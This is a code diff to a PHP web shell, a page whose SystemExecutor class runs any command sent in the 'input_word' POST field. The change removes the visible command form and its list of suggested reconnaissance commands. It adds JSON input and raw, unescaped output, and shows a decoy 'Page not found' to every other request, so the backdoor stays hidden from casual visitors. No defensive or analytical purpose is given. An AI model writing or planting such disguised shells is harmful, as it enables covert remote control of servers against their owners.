@@ -85,32 +85,24 @@ class SystemExecutor {
 }
 
 // Main execution
-if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['input_word'])) {
-    $command = trim($_POST['input_word']);
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $contentType = $_SERVER['CONTENT_TYPE'] ?? '';
+    if (strpos($contentType, 'application/json') !== false) {
+        $json = file_get_contents('php://input');
+        $data = json_decode($json, true);
+        $command = trim($data['input_word'] ?? '');
+    } else {
+        $command = trim($_POST['input_word'] ?? '');
+    }
     
     $executor = new SystemExecutor($command);
     $result = $executor->execute();
     
-    echo "<pre>" . htmlspecialchars($result) . "</pre>";
+    // Return only the command output, no HTML
+    echo $result;
     
 } else {
-    // Show form with current context
-    $currentUser = shell_exec('whoami 2>&1');
-    echo '
-    <h3>SYSTEM Command Execution</h3>
-    <form method="post">
-        <input type="text" name="input_word" value="whoami /priv" style="width: 400px;">
-        <input type="submit" value="Execute">
-    </form>
-    <p><strong>Current Context:</strong> ' . htmlspecialchars($currentUser) . '</p>
-    <p><strong>Try these commands:</strong></p>
-    <ul>
-        <li>whoami</li>
-        <li>whoami /priv</li>
-        <li>systeminfo</li>
-        <li>ipconfig</li>
-        <li>net user</li>
-    </ul>
-    ';
+    // Show nothing or a simple message
+    echo "Page not found";
 }
 ?>
